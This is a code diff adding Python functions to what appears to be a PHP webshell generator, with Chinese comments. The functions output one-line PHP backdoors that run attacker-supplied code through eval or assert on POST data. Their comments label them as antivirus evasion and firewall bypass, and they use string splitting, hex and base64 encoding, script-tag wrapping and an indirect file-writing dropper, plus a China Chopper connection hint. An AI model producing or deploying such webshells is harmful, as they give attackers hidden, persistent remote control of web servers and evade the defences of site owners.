@@ -94,3 +94,51 @@ $_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
 @$_[00]($__H_H($__H_H($__C_C)));
  
 ?>'''
+
+#免杀
+def php_miansha(pwd):
+    return '<!--?php $x="as"."se"."rt";$x($_POST["'+pwd+'"]);?-->'
+
+
+def php_jianjiexxiema():
+    '''间接写马'''
+    fname=input('需写入马的文件名:')
+    pwd=input('需写入马的密码:')
+    codecmode=input('需写入马的编码模式:\n1.hex\n2.base64\n')
+    if codecmode not in ('1','2'):
+        print('请选择正确的模式')
+        return ''
+
+    def expansion(s):
+        if len(s)==1:
+            return '0'+s
+        return s
+
+    if codecmode=='1':
+        base='<!--?php fputs (fopen(pack("H*","{fname}"),"w"),pack("H*","{pwd}"))?-->'
+        pwd='<?@eval($_POST[{}])?>'.format(pwd)
+
+        fname=''.join([expansion(hex(ord(c)).replace('0x', '')) for c in fname])
+        pwd=''.join([expansion(hex(ord(c)).replace('0x', '')) for c in pwd])
+        return base.format(fname=fname,pwd=pwd)
+
+    elif codecmode=='2':
+        import base64
+        base="<!--?php @fputs(fopen(base64_decode('{fname}'),w),base64_decode('{pwd}'));?-->"
+        pwd="<?php @eval($_POST['{}']);?>".format(pwd)
+
+        fname=base64.b64encode(fname.encode('utf-8')).decode('utf-8')
+        pwd=base64.b64encode(pwd.encode('utf-8')).decode('utf-8')
+        return base.format(fname=fname,pwd=pwd)
+
+
+def php_no_wenhao(pwd):
+    return '''<script type="text/javascript" language="php">// <![CDATA[ 
+eval ($_POST[{}]); 
+// ]]></script>'''.format(pwd)
+
+def php_guogou(pwd):
+    print("//菜刀地址 http://xx/xx.php?s=assert'")
+    return '<!--?php ($_=@$_GET[s]).@$_($_POST[{}])?--> '.format(pwd)
+
+
